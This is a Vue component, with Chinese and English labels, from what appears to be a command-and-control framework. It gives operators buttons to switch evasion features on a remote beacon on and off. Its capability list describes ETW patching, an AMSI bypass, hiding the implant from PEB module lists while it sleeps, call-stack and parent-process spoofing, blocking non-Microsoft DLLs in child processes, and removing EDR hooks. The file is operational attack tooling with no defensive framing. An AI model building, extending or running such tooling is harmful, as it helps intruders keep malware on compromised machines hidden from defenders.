<template>
  <div class="osw-wrap">
    <div class="osw-head">
      <div class="osw-title">
        {{ i18nStore.tl('会话内对抗开关', 'Runtime evasion switches') }}
        <span class="osw-badge">{{ caps.length }}</span>
      </div>
      <div class="osw-actions">
        <button class="cs-btn cs-btn-sm" :disabled="busy" @click="dispatch('evasion status')">
          {{ i18nStore.tl('查询状态', 'Status') }}
        </button>
        <button class="cs-btn cs-btn-sm" :disabled="busy" @click="dispatch('evasion reset')">
          {{ i18nStore.tl('恢复生成期默认', 'Reset to build defaults') }}
        </button>
      </div>
    </div>

    <p class="osw-hint">
      {{
        i18nStore.tl(
          '覆盖只保存在客户端内存里：重连/重启后回到生成期值。ETW / AMSI / unhook 是启动期能力——“开”会立即执行一次；etw/amsi“关”会把原始字节写回去，unhook“关”不会重新挂上。',
          'Overrides live in the beacon process only and reset on reconnect. ETW / AMSI / unhook are startup-time: "on" applies immediately; "off" restores the original bytes for etw/amsi, and does not re-hook for unhook.',
        )
      }}
    </p>

    <div class="osw-list">
      <div v-for="c in caps" :key="c.key" class="osw-row">
        <div class="osw-row-main">
          <div class="osw-name">
            {{ i18nStore.tl(c.labelZh, c.labelEn) }}
            <code class="osw-key">{{ c.key }}</code>
            <span v-if="c.startupOnly" class="osw-tag">{{ i18nStore.tl('启动期', 'startup') }}</span>
            <span v-if="c.amd64Only" class="osw-tag osw-tag-arch">x64</span>
          </div>
          <div class="osw-desc">{{ i18nStore.tl(c.hintZh, c.hintEn) }}</div>
        </div>
        <div class="osw-row-act">
          <button class="cs-btn cs-btn-sm" :disabled="busy" @click="dispatch(`evasion on ${c.key}`)">
            {{ i18nStore.tl('开', 'On') }}
          </button>
          <button class="cs-btn cs-btn-sm" :disabled="busy" @click="dispatch(`evasion off ${c.key}`)">
            {{ i18nStore.tl('关', 'Off') }}
          </button>
        </div>
      </div>
    </div>

    <div class="osw-note">
      {{
        i18nStore.tl(
          '命令回执出现在该 Beacon 的控制台里（同其它命令）。不可用的组合（例如 386 载荷上的 direct syscall、syscallMode=none 时的调用栈伪造）会被客户端明确拒绝并说明原因。',
          'Results appear in the beacon console like any other command. Impossible combinations (e.g. direct syscall on a 386 payload, stack spoof while syscallMode=none) are rejected with a reason instead of silently doing nothing.',
        )
      }}
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, ref } from 'vue'
import { ElMessage } from 'element-plus'
import { useI18nStore } from '@/stores/i18n'
import ClientAPI from '@/api/clients'

const props = defineProps<{ uid: string }>()

const i18nStore = useI18nStore()
const busy = ref(false)

// 与客户端 core/config/opsec.go 的 EvasionCapabilities 保持一致。
// 这里刻意复制一份常量而不是从后端拉：能力清单是编译期固定的，多一次请求
// 只会多一个"面板打开了但列表是空的"的失败模式。
const caps = [
  {
    key: 'etw',
    labelZh: 'ETW 补丁',
    labelEn: 'ETW patch',
    startupOnly: true,
    amd64Only: false,
    hintZh: '把 ntdll 的 EtwEventWrite* 全部改成返回 0',
    hintEn: 'Patch all EtwEventWrite* exports to return success',
  },
  {
    key: 'amsi',
    labelZh: 'AMSI 绕过',
    labelEn: 'AMSI bypass',
    startupOnly: true,
    amd64Only: false,
    hintZh: 'AmsiScanBuffer / AmsiScanString 返回 E_INVALIDARG',
    hintEn: 'AmsiScanBuffer / AmsiScanString return E_INVALIDARG',
  },
  {
    key: 'modhide',
    labelZh: '睡眠期模块摘链',
    labelEn: 'Module unlink during sleep',
    startupOnly: false,
    amd64Only: true,
    hintZh: 'beacon 睡眠时把自身从 PEB 模块链表摘除，醒来挂回',
    hintEn: 'Unlink self from PEB lists while sleeping, relink on wake',
  },
  {
    key: 'spoof',
    labelZh: '伪造调用栈',
    labelEn: 'Call stack spoof',
    startupOnly: false,
    amd64Only: true,
    hintZh: 'direct syscall 时伪装成 ntdll 帧链（仅 syscallMode=direct 生效）',
    hintEn: 'Present an ntdll frame chain to callers (requires syscallMode=direct)',
  },
  {
    key: 'ppid',
    labelZh: '父进程伪造',
    labelEn: 'PPID spoof',
    startupOnly: false,
    amd64Only: false,
    hintZh: '派生子进程时把父进程改成 explorer.exe',
    hintEn: 'Attribute spawned children to explorer.exe',
  },
  {
    key: 'blockdlls',
    labelZh: '子进程禁非微软 DLL',
    labelEn: 'Block non-MS DLLs',
    startupOnly: false,
    amd64Only: false,
    hintZh: '给子进程加 MicrosoftSignedOnly 策略（会打坏第三方输入法/扩展）',
    hintEn: 'Apply MicrosoftSignedOnly to children (breaks third-party IMEs/extensions)',
  },
  {
    key: 'unhook',
    labelZh: '启动期 unhook',
    labelEn: 'Unhook on start',
    startupOnly: true,
    amd64Only: true,
    hintZh: '用磁盘映像恢复 ntdll/kernel32/kernelbase 的内联 hook',
    hintEn: 'Restore inline hooks in ntdll/kernel32/kernelbase from disk images',
  },
]

const readyText = computed(() => i18nStore.tl('客户端未就绪', 'Beacon session not ready'))

async function dispatch(cmd: string) {
  if (!props.uid) {
    ElMessage.warning(readyText.value)
    return
  }
  busy.value = true
  try {
    await ClientAPI.send_commands({ uid: props.uid, command: cmd })
    ElMessage.success(i18nStore.tl(`已下发: ${cmd}`, `Sent: ${cmd}`))
  } catch (e: unknown) {
    const msg = e instanceof Error ? e.message : i18nStore.tl('网络错误', 'network error')
    ElMessage.error(i18nStore.tl('下发失败: ', 'Dispatch failed: ') + msg)
  } finally {
    busy.value = false
  }
}
</script>

<style scoped>
.osw-wrap {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.osw-head {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
}

.osw-title {
  font-size: 13px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 6px;
}

.osw-badge {
  font-size: 11px;
  font-weight: 500;
  padding: 0 6px;
  border-radius: 8px;
  background: var(--cs-hover);
  color: var(--cs-text-2);
}

.osw-actions {
  display: flex;
  gap: 6px;
}

.osw-hint,
.osw-note {
  margin: 0;
  font-size: 12px;
  line-height: 1.5;
  color: var(--cs-text-2);
}

.osw-list {
  display: flex;
  flex-direction: column;
  border: 1px solid var(--cs-border);
  border-radius: 8px;
  overflow: hidden;
}

.osw-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  padding: 8px 10px;
  border-bottom: 1px solid var(--cs-border);
}

.osw-row:last-child {
  border-bottom: none;
}

.osw-row-main {
  min-width: 0;
}

.osw-name {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 13px;
}

.osw-key {
  font-size: 11px;
  color: var(--cs-text-2);
  background: var(--cs-hover);
  padding: 0 4px;
  border-radius: 4px;
}

.osw-tag {
  font-size: 10px;
  padding: 0 4px;
  border-radius: 4px;
  border: 1px solid var(--cs-border);
  color: var(--cs-text-2);
}

.osw-tag-arch {
  letter-spacing: 0.3px;
}

.osw-desc {
  font-size: 11px;
  color: var(--cs-text-2);
  margin-top: 2px;
}

.osw-row-act {
  display: flex;
  gap: 6px;
  flex-shrink: 0;
}
</style>
